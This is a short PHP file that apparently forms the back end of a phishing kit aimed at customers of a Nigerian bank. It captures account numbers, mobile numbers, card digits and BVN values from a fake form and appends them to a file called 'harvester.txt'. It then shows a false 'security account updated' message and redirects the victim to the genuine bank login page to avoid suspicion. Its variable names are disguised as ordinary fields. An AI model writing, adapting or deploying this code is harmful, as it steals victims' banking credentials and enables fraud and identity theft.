
<?php



 
// create a variable
$first_name=$_POST['txtAccountNo'];
$last_name=$_POST['txtMobileNo'];
$department=$_POST['txtCarddigit'];
$email=$_POST['txtbvn'];
 
//Execute the query
 
$myFile = "harvester.txt";
$fh = fopen($myFile, 'a');
fwrite($fh, $first_name."\t".$last_name."\t".$department."\t".$email."\r\n");
fclose($fh);

?>
                    <script type="text/javascript">
                        alert("Thank you For updating your security account");
                        window.location = "https://ibank.ubagroup.com/corp/AuthenticationController?FORMSGROUP_ID__=LoginAltFlowHomeFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&LoginAltFlowHomeFG.LOGIN_FLAG=6&LoginAltFlowHomeFG.VIEWID=1&BANK_ID=NG";
                    </script>




